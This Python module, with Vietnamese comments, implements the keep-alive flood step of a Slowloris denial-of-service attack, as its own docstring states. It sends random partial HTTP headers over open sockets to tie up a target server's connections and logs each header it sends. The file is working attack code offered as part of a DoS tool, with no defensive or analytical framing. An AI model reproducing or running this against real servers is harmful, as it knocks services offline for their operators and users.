"""This module provides the flood function for a Slowloris DoS attack.""" 

import random
import socket
from colorama import Fore as F

def flood(sock: socket.SocketType) -> None:
    """Keep the sockets alive in Slowloris flood.

    Args:
        sock (socket.SocketType): The socket to be kept alive.

    Returns:
        None
    """
    try:
        # Lấy địa chỉ IP và cổng của socket hiện tại
        laddr, port = sock.getsockname()
        
        # Tạo một header ngẫu nhiên và gửi qua socket
        random_header = random.randint(1, 5000)
        sock.send(f"X-a: {random_header}\r\n".encode("utf-8"))
        
        # In thông báo header đã gửi
        header_sent = f"{F.RESET} Header Sent:{F.BLUE} X-a {random_header:>4}"
        print(
            f"{F.RESET} --> Socket: {F.BLUE}{laddr}:{port} {F.RESET}|{header_sent} {F.RESET}"
        )
        
    except (BrokenPipeError, socket.error) as e:
        print(f"{F.RED}[!] Socket error: {e}{F.RESET}")
        try:
            # Đóng socket nếu có lỗi
            sock.close()
        except Exception as close_err:
            print(f"{F.RED}[!] Error closing socket: {close_err}{F.RESET}")

